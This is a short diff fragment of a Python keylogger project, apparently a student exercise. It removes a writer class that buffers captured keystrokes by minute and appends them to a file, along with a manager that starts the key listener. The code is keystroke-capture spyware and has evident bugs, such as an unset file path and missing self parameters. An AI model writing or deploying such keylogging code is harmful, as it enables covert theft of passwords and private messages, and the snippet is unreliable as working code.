@@ -46,34 +46,3 @@ class KeyLogger:
 
 
 
-class Writer(ABC):
-    @abstractmethod
-    def write(key: str):
-        pass
-    @abstractmethod
-    def send(buffer):
-        pass
-
-
-
-#  מחלקת כותב. מורישה מתודה של כתוב ומתודה של שלח
-class FileWriter(Writer):
-    def __init__(self):
-        self.text_dict = {}
-        self.cur_min = datetime.now().strftime('%Y-%m-%d %H:%M')
-        # self.file_path = file_path
-    def write(self, key: str):
-        if self.cur_min not in self.text_dict:
-            self.text_dict[self.cur_min] = key
-        else:
-            self.text_dict[self.cur_min] += key
-    def send(self, buffer):
-        with open(self.file_path, "a") as file:
-            file.write(self.text_dict)
-
-
-class Manager:
-    Listener.start(KeyLogger())
-
-
-Manager()
